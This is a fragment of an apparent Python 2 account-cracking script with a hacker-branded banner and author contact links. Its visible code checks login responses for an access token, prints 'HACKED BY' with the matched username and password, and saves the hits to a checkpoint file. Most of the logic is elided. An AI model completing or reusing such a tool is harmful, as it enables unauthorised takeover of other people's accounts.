...
logo = """
  ...
  / _ \ | | | 
 / ___ \| | |
/_/   \_\_|_|  Ali_Rastagar_Hacker007...
            
 
--------------------------------------------------
 Author      : Ali Rastagar
 GitHub      : https://github.com/AliRastagarHacker007
 YouTube     : Ali Master
 Telegram    : https://t.me/Ali_Rastagar_Hacker007
 Blogspot    : No
--------------------------------------------------
"""
back = 0
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92mHACKED BY Ali Rastagar \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
